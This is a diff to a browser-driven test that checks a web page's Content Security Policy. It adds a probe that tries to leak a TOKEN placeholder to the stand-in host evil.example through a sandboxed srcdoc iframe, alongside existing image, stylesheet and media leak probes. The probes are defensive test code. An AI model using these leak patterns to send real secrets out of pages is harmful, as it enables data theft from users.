@@ -55,6 +55,7 @@ async function until(page, what, fn, arg, ms = 30000) {
     const u = r.url();
     if (u.startsWith("https://images.example/")) { requested.push(u); return r.respond({ status: 200, contentType: "image/png", body: Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==", "base64") }); }
     if (u.startsWith("https://styles.example/")) { requested.push(u); return r.respond({ status: 200, contentType: "text/css", body: "h1{color:rgb(1,2,3)}" }); }
+    if (u.startsWith("https://evil.example/f.png")) requested.push(u);
     // the page's own origin (a local server, or the deployed site when the test is
     // pointed at it) is served for real; every other host is answered here
     if (u.startsWith(new URL(url).origin + "/")) return r.continue();
@@ -99,6 +100,10 @@ async function until(page, what, fn, arg, ms = 30000) {
     await attempt("image", () => { new Image().src = "https://evil.example/i.png?x=TOKEN"; });
     await attempt("stylesheet", () => { const l = document.createElement("link"); l.rel = "stylesheet"; l.href = "https://evil.example/s.css?x=TOKEN"; document.head.appendChild(l); });
     await attempt("media", () => { const a = document.createElement("audio"); a.src = "https://evil.example/a.mp3?x=TOKEN"; a.load(); });
+    // the routes through a frame (go-slides#90): a srcdoc frame inherits the
+    // page's policy, so it is as open as the page is; a frame loaded from a URL
+    // has a policy of its own, which the page feeds (see the page's comment)
+    await attempt("srcdocframe", () => { const i = document.createElement("iframe"); i.sandbox = "allow-scripts"; i.srcdoc = '<img src="https://evil.example/f.png?x=TOKEN">'; document.body.appendChild(i); });
     return out;
   });
   const need = ["fetch", "xhr", "form", "frame", "object", "worker", "script", "import", "base", "beacon"];
@@ -108,6 +113,9 @@ async function until(page, what, fn, arg, ms = 30000) {
   // page's policy); if one is now refused, the note in the page and the README are
   // out of date
   const open = ["image", "stylesheet", "media"];
+  // a violation inside the frame is not seen by the page's listener: the request
+  // itself is the witness
+  if (!requested.some((u) => u.startsWith("https://evil.example/f.png"))) console.error("note: a srcdoc frame's image request is now refused: update the comment in the page and the README");
   for (const k of open) if (probes[k].length !== 0) console.error("note: a " + k + " request is now refused (" + JSON.stringify(probes[k]) + "): update the comment in the page and the README");
   await browser.close();
   console.log("CSP_OK " + JSON.stringify({ refused: need, stillOpen: open.filter((k) => probes[k].length === 0), preview: requested.length }));
